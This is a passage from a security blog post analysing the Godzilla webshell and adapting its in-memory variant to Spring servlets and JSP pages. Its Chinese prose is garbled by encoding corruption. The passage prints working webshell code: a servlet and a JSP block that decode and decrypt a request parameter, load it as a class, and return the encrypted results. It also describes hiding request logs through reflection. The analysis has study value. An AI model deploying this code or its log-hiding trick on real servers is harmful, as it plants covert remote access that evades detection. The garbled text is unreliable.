<p>ç»§ç»­è·Ÿè¿›åˆ¤æ–­<code>this.servletRequest</code>ä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œå°è¯•è·å–<code>servletRequest</code>é‡Œé¢çš„<code>parameters</code>å¯¹è±¡ï¼Œç»è¿‡åˆ¤æ–­ä¹‹åèµ‹ç»™<code>this.requestData</code>ã€‚<br><img src="/2022/05/17/godzilla/13.png"></p>
<p>è¿™é‡Œä¹‹æ‰€ä»¥åˆå¡«å……ä¸€æ¬¡<code>this.requestData</code>å˜é‡ï¼Œæ˜¯ä¸ºäº†å…¼å®¹æ€§è€ƒè™‘ï¼Œæ¯”å¦‚åœ¨Springé‡Œé¢ç›´æ¥å†™servletï¼Œç»è¿‡ç¬¬äºŒæ¬¡çš„<code>equals()</code>å°±å¡«å……äº†<code>this.requestData</code>å¯¹è±¡ï¼Œä½†æ˜¯åœ¨JSPé‡Œé¢ï¼Œæ˜¯åˆ©ç”¨<br><code>request.setAttribute(&quot;parameters&quot;, data);</code>æ¥èµ°åˆ°ä¸Šé¢è¿™ä¸€æ­¥å¡«å……<code>this.requestData</code>å¯¹è±¡ï¼Œè¿™ä¹Ÿæ˜¯å“¥æ–¯æ‹‰å¯¹servletæ²¡æœ‰ä¾èµ–çš„ä¸»è¦åŸå› ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">  <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//                Object f = payload.newInstance();</span>
                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨JSPé‡Œé¢è§£æ<code>pageContext</code>å¯¹è±¡:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">X</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Q</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"parameters"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
            f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
<span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ¥ç€ä¼šèµ°åˆ°<code>nolog</code>é‡Œé¢ï¼Œåˆ©ç”¨åå°„éšè—è¯·æ±‚çš„æ—¥å¿—ã€‚è¿™é‡Œåº”è¯¥æ˜¯åªéšè—åœ¨tomcatä¸‹çš„æ—¥å¿—ï¼Œæœªæµ‹è¯•ã€‚</p>
<h4 id="f-toString"><a href="#f-toString" class="headerlink" title="f.toString()"></a><code>f.toString()</code></h4><p>ä»<code>this.paramterMap</code>é‡Œé¢è·å–è¦æ‰§è¡Œçš„æ¨¡å—å‚æ•°ç­‰å˜é‡ï¼Œç„¶åè¿›å…¥<code>this.run()</code>æ‰§è¡Œ<code>payload.class</code>å®šä¹‰å¥½çš„shellåŠŸèƒ½ï¼š<br><img src="/2022/05/17/godzilla/7.png"></p>
<p>ç¬¬ä¸‰æ¬¡è¯·æ±‚æ˜¯è°ƒç”¨äº†<code>methodNameClose</code>å‡½æ•°ï¼Œä¸å†åˆ†æã€‚æ•´ä¸ªæµç¨‹åˆ†æä¸‹æ¥ä¼šå‘ç°å“¥æ–¯æ‹‰ä¸€å¼€å§‹å°±æŠŠä¸€ä¸ªå¤§é©¬çš„åŠŸèƒ½å®ç°å‘é€åˆ°äº†æœåŠ¡ç«¯ï¼Œä¹‹åçš„åŠŸèƒ½éƒ½æ˜¯é€šè¿‡è°ƒç”¨å¤§é©¬å®ç°å¥½çš„åŠŸèƒ½å®Œæˆçš„ã€‚</p>
<p>è‡³æ­¤Y4erå¸ˆå‚…çš„æ–‡ç« ç®—æ˜¯çœ‹æ‡‚äº†ï¼š<a target="_blank" rel="noopener" href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜</a></p>
<p>åœ¨Springé‡Œé¢çš„ä¸‰ä¸ª<code>equeals</code>:</p>
<ul>
<li>f.equals(arrOut) å¿…é¡»çš„ï¼Œä½¿ç”¨ByteArrayOutputStreamè¿”å›æ‰§è¡Œçš„ç»“æœ</li>
<li>f.equals(data)   å¿…é¡»çš„ï¼Œæ¥æ”¶å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„å‚æ•°</li>
<li>f.equals(req)    éå¿…è¦ï¼Œå¯¹äºSpringçš„Servletæ˜¯éå¿…è¦çš„ï¼Œç”¨äºéšè—æ—¥å¿—ã€‚</li>
</ul>
<p>æ‰€ä»¥åœ¨Springé‡Œé¢çš„Servletï¼Œç¬¬ä¸‰ä¸ª<code>equals</code>å»æ‰ä¸å½±å“æ­£å¸¸shellåŠŸèƒ½ã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a target="_blank" rel="noopener" href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lmL6XyWKClEmYgiVUspYYw">å“¥æ–¯æ‹‰æºç åˆ†æ(äºŒ)jsp shellåˆ†æ</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1513/">Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/issues/151">æƒ³å°è¯•ä¿®æ”¹åˆ°Spring boot å†…å­˜é©¬çš„æ”¯æŒä¸­ï¼Œè€ŒSpringæ²¡æœ‰pageContextå¯¹è±¡</a></li>
</ul>

	</div>

	
	<span id="/2022/05/17/godzilla.html" class="leancloud-visitors view" data-flag-title="å“¥æ–¯æ‹‰åŸç†åˆ†æ">
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2022/06/23/java-agent-shell.html" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2022/04/14/memory-shell-1.html" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2022-05-17 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Java/">Java<span>8</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90%E8%83%8C%E6%99%AF"><span class="toc-article-text">åˆ†æèƒŒæ™¯</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-article-text">è¿è¡ŒåŸç†</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AF%B7%E6%B1%82"><span class="toc-article-text">ç¬¬ä¸€æ¬¡è¯·æ±‚</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AF%B7%E6%B1%82"><span class="toc-article-text">ç¬¬äºŒæ¬¡è¯·æ±‚</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#f-equals-arrOut"><span class="toc-article-text">f.equals(arrOut)</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#f-equals-data"><span class="toc-article-text">f.equals(data)</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#f-equals-req"><span class="toc-article-text">f.equals(req)</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#f-toString"><span class="toc-article-text">f.toString()</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">å‚è€ƒé“¾æ¥</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
